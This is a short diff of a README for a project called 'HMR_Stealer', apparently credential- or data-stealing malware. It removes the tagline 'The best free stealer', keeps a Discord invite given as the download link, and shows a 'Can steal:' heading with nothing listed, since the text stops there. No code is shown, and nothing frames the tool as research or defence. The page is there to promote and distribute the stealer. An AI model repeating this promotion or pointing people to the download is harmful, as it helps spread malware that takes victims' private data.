@@ -1,5 +1,4 @@
 # HMR_Stealer
-## The best free stealer
 > Download: https://discord.gg/H7f3dGpGNQ
 
 Can steal:
